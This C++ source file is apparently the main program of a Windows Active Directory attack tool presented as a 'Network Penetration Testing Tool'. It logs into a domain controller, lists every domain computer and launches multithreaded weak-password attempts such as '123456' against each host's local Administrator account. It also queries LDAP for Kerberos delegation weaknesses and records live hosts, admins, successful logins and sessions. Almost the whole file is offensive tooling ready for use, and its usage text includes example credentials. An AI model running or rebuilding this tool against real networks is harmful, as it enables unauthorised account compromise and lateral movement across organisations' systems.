#include "WNetApi.h"
#include "CommonApi.h"
#include "MultiThread.h"
#include "LdapApi.h"
#include <ctime>
#include <thread>
#include <iostream>
#include <algorithm>

// Command line argument indices
enum CommandLineArgs
{
    ARG_PROGRAM_NAME = 0,
    ARG_DC_IP,
    ARG_DC_NAME,
    ARG_DOMAIN_USER,
    ARG_PASSWORD,
    ARG_WEAK_PASSWORD,
    ARG_THREAD_COUNT,
    ARG_TOTAL_COUNT
};

/**
 * @brief Display usage information
 * @param programName Name of the executable
 */
void DisplayUsage(const wchar_t* programName)
{
    wprintf(L"\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Network Penetration Testing Tool\n");
    wprintf(L"=================================================================\n\n");
    wprintf(L"USAGE:\n");
    wprintf(L"  %s <DC-IP> <DC-Name> <Domain\\Username> <Password> <WeakPassword> <ThreadCount>\n\n", programName);
    
    wprintf(L"PARAMETERS:\n");
    wprintf(L"  DC-IP          : Domain Controller IP (e.g., \\\\192.168.1.10)\n");
    wprintf(L"  DC-Name        : Domain Controller name (e.g., domain.local)\n");
    wprintf(L"  Domain\\Username: Authentication credentials (e.g., DOMAIN\\user)\n");
    wprintf(L"  Password       : User password (use NULL for machine account)\n");
    wprintf(L"  WeakPassword   : Common password to test (e.g., 123456)\n");
    wprintf(L"  ThreadCount    : Number of concurrent threads\n\n");
    
    wprintf(L"EXAMPLES:\n");
    wprintf(L"  1. Using domain user:\n");
    wprintf(L"     %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei lw123!@# 123456 1\n\n", programName);
    
    wprintf(L"  2. Using machine account:\n");
    wprintf(L"     %s \\\\192.168.159.149 Motoo.nc Motoo\\PC01$ NULL 123456 1\n\n", programName);
    
    wprintf(L"NOTE:\n");
    wprintf(L"  - Use NULL as password for machine accounts\n");
    wprintf(L"  - WeakPassword is tested against local Administrator accounts\n");
    wprintf(L"  - Thread count should be between 1-50 for optimal performance\n");
    wprintf(L"=================================================================\n\n");
}

/**
 * @brief Parse domain and username from domain\username format
 * @param domainUserName Full domain username string
 * @param domainName Output parameter for domain name
 * @param userName Output parameter for username
 * @return true if parsing successful, false otherwise
 */
bool ParseDomainUsername(
    const std::wstring& domainUserName,
    std::wstring& domainName,
    std::wstring& userName)
{
    size_t separatorPos = domainUserName.find(L'\\');
    
    if (separatorPos == std::wstring::npos)
    {
        return false;
    }

    domainName = domainUserName.substr(0, separatorPos);
    userName = domainUserName.substr(separatorPos + 1);
    
    return !domainName.empty() && !userName.empty();
}

/**
 * @brief Build password list for weak password attacks
 * @param weakPassword Primary weak password to test
 * @return Vector of passwords to try
 */
std::vector<std::wstring> BuildPasswordList(const std::wstring& weakPassword)
{
    std::vector<std::wstring> passwordList;

    // Add user-specified weak password
    if (!weakPassword.empty() && _wcsicmp(weakPassword.c_str(), L"123456") != 0)
    {
        passwordList.push_back(weakPassword);
    }

    // Add common passwords
    passwordList.push_back(L"123456");
    
    return passwordList;
}

/**
 * @brief Create output files for logging results
 * @param commonApi CommonApi instance
 * @param aliveFile Output handle for alive hosts
 * @param localFile Output handle for local administrators
 * @param successFile Output handle for successful authentications
 * @param sessionsFile Output handle for network sessions
 * @param delegFile Output handle for delegation vulnerabilities
 * @return true if all files created successfully, false otherwise
 */
bool CreateOutputFiles(
    CommonApi& commonApi,
    HANDLE& aliveFile,
    HANDLE& localFile,
    HANDLE& successFile,
    HANDLE& sessionsFile,
    HANDLE& delegFile)
{
    aliveFile = commonApi.CreateFileApi(L"alive.txt");
    localFile = commonApi.CreateFileApi(L"local.txt");
    successFile = commonApi.CreateFileApi(L"success.txt");
    sessionsFile = commonApi.CreateFileApi(L"NetSessions.txt");
    delegFile = commonApi.CreateFileApi(L"Deleg.txt");

    return (aliveFile != INVALID_HANDLE_VALUE &&
            localFile != INVALID_HANDLE_VALUE &&
            successFile != INVALID_HANDLE_VALUE &&
            sessionsFile != INVALID_HANDLE_VALUE &&
            delegFile != INVALID_HANDLE_VALUE);
}

/**
 * @brief Close all output file handles
 */
void CloseOutputFiles(HANDLE aliveFile, HANDLE localFile, HANDLE successFile,
                      HANDLE sessionsFile, HANDLE delegFile)
{
    if (aliveFile != INVALID_HANDLE_VALUE) CloseHandle(aliveFile);
    if (localFile != INVALID_HANDLE_VALUE) CloseHandle(localFile);
    if (successFile != INVALID_HANDLE_VALUE) CloseHandle(successFile);
    if (sessionsFile != INVALID_HANDLE_VALUE) CloseHandle(sessionsFile);
    if (delegFile != INVALID_HANDLE_VALUE) CloseHandle(delegFile);
}

/**
 * @brief Check for delegation vulnerabilities
 * @param dcName Domain controller name
 * @param userName Username for LDAP authentication
 * @param password Password for LDAP authentication
 * @param delegFile Output file handle
 * @return true if check completed successfully, false otherwise
 */
bool CheckDelegationVulnerabilities(
    LPCWSTR dcName,
    LPCWSTR userName,
    LPCWSTR password,
    HANDLE delegFile)
{
    wprintf(L"\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Checking Delegation Vulnerabilities...\n");
    wprintf(L"=================================================================\n");

    LdapApi ldapApi(dcName, const_cast<PWCHAR>(userName), const_cast<PWCHAR>(password), delegFile);
    
    if (!ldapApi.Connect())
    {
        wprintf(L"[Error] Failed to connect to LDAP server\n");
        return false;
    }

    // Check Resource-Based Constrained Delegation
    ldapApi.QueryResourceBasedConstrainedDelegation();
    
    // Check Constrained Delegation
    ldapApi.QueryConstrainedDelegation();
    
    // Check Unconstrained Delegation
    ldapApi.QueryUnconstrainedDelegation();

    wprintf(L"=================================================================\n\n");
    return true;
}

/**
 * @brief Execute multi-threaded network scanning and attack
 * @param domainUserName Full domain username
 * @param domainPassword Domain password
 * @param passwordList List of passwords to try
 * @param threadCount Number of threads to use
 * @param hostList List of hosts to scan
 * @param fileHandles Output file handles
 */
void ExecuteMultiThreadedAttack(
    LPWSTR domainUserName,
    LPWSTR domainPassword,
    const std::vector<std::wstring>& passwordList,
    int threadCount,
    std::vector<std::wstring>& hostList,
    HANDLE aliveFile,
    HANDLE localFile,
    HANDLE successFile,
    HANDLE sessionsFile)
{
    wprintf(L"\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Starting Network Scan and Attack...\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Threads: %d\n", threadCount);
    wprintf(L"  Targets: %zu\n", hostList.size());
    wprintf(L"=================================================================\n\n");

    MultiThread multiThread(
        domainUserName,
        domainPassword,
        passwordList,
        aliveFile,
        localFile,
        successFile,
        sessionsFile
    );

    // Create thread pool
    std::vector<std::thread> threads;
    threads.reserve(threadCount);

    for (int i = 0; i < threadCount; ++i)
    {
        threads.emplace_back(&MultiThread::AttackWorker, &multiThread, i, &hostList);
    }

    // Wait for all threads to complete
    for (auto& thread : threads)
    {
        if (thread.joinable())
        {
            thread.join();
        }
    }

    wprintf(L"\n[*] Scan completed!\n");
}

/**
 * @brief Main entry point
 */
int wmain(int argc, wchar_t* argv[])
{
    // Set locale for wide character support
    setlocale(LC_ALL, "");

    // Validate command line arguments
    if (argc != ARG_TOTAL_COUNT)
    {
        DisplayUsage(argv[ARG_PROGRAM_NAME]);
        return 1;
    }

    // Start timer
    clock_t startTime = clock();

    // Parse command line arguments
    LPWSTR dcIp = argv[ARG_DC_IP];
    LPWSTR dcName = argv[ARG_DC_NAME];
    LPWSTR domainUserName = argv[ARG_DOMAIN_USER];
    LPWSTR domainPassword = argv[ARG_PASSWORD];
    LPCWSTR weakPassword = argv[ARG_WEAK_PASSWORD];
    LPCWSTR threadCountStr = argv[ARG_THREAD_COUNT];

    // Parse domain and username
    std::wstring fullUsername(domainUserName);
    std::wstring domainName, userName;
    
    if (!ParseDomainUsername(fullUsername, domainName, userName))
    {
        wprintf(L"[Error] Invalid domain\\username format\n");
        return 1;
    }

    // Parse thread count
    CommonApi commonApi;
    auto threadCountAnsi = commonApi.UnicodeToAnsi(threadCountStr);
    int threadCount = threadCountAnsi ? atoi(threadCountAnsi.get()) : 1;
    
    if (threadCount < 1 || threadCount > 50)
    {
        wprintf(L"[Warning] Thread count adjusted to valid range (1-50)\n");
        threadCount = (std::min)((std::max)(threadCount, 1), 50);
    }

    // Handle NULL password for machine accounts
    if (_wcsicmp(domainPassword, L"NULL") == 0)
    {
        domainPassword = nullptr;
    }

    // Build password list for weak password attacks
    std::vector<std::wstring> passwordList = BuildPasswordList(weakPassword);

    // Display configuration
    wprintf(L"\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Configuration\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Domain Controller : %s (%s)\n", dcName, dcIp);
    wprintf(L"  Domain            : %s\n", domainName.c_str());
    wprintf(L"  Username          : %s\n", userName.c_str());
    wprintf(L"  Password          : %s\n", domainPassword ? L"[PROVIDED]" : L"[NULL/Machine Account]");
    wprintf(L"  Weak Password     : %s\n", weakPassword);
    wprintf(L"  Thread Count      : %d\n", threadCount);
    wprintf(L"=================================================================\n\n");

    // Create output files
    HANDLE aliveFile, localFile, successFile, sessionsFile, delegFile;
    if (!CreateOutputFiles(commonApi, aliveFile, localFile, successFile, sessionsFile, delegFile))
    {
        wprintf(L"[Error] Failed to create output files\n");
        return 1;
    }

    // Connect to domain controller
    WNetApi wnetApi;
    wprintf(L"[*] Connecting to Domain Controller...\n");
    
    if (!wnetApi.ConnectToShare(dcIp, domainUserName, domainPassword))
    {
        wprintf(L"[Error] Failed to connect to %s (Error: %d)\n", dcIp, GetLastError());
        CloseOutputFiles(aliveFile, localFile, successFile, sessionsFile, delegFile);
        return 1;
    }
    
    wprintf(L"[Success] Connected to Domain Controller\n");

    // Check delegation vulnerabilities (only if password is provided)
    if (domainPassword != nullptr)
    {
        CheckDelegationVulnerabilities(
            dcName,
            userName.c_str(),
            domainPassword,
            delegFile
        );
    }

    // Get list of domain computers
    wprintf(L"[*] Retrieving domain computer list...\n");
    std::vector<std::wstring> hostList = wnetApi.GetDomainComputerList(dcIp, L"Domain Computers");

    if (hostList.empty())
    {
        wprintf(L"[Error] No computers found in domain\n");
        CloseOutputFiles(aliveFile, localFile, successFile, sessionsFile, delegFile);
        return 1;
    }

    // Execute multi-threaded attack
    ExecuteMultiThreadedAttack(
        domainUserName,
        domainPassword,
        passwordList,
        threadCount,
        hostList,
        aliveFile,
        localFile,
        successFile,
        sessionsFile
    );

    // Close output files
    CloseOutputFiles(aliveFile, localFile, successFile, sessionsFile, delegFile);

    // Display execution time
    clock_t endTime = clock();
    double elapsedTime = static_cast<double>(endTime - startTime) / CLOCKS_PER_SEC;
    
    wprintf(L"\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Execution Summary\n");
    wprintf(L"=================================================================\n");
    wprintf(L"  Total Time        : %.2f seconds\n", elapsedTime);
    wprintf(L"  Targets Processed : %zu\n", hostList.size());
    wprintf(L"  Threads Used      : %d\n", threadCount);
    wprintf(L"=================================================================\n");
    wprintf(L"\n[*] Results saved to:\n");
    wprintf(L"    - alive.txt       : Live hosts\n");
    wprintf(L"    - local.txt       : Local administrators\n");
    wprintf(L"    - success.txt     : Successful authentications\n");
    wprintf(L"    - NetSessions.txt : Active network sessions\n");
    wprintf(L"    - Deleg.txt       : Delegation vulnerabilities\n");
    wprintf(L"\n[*] Done!\n\n");

    return 0;
}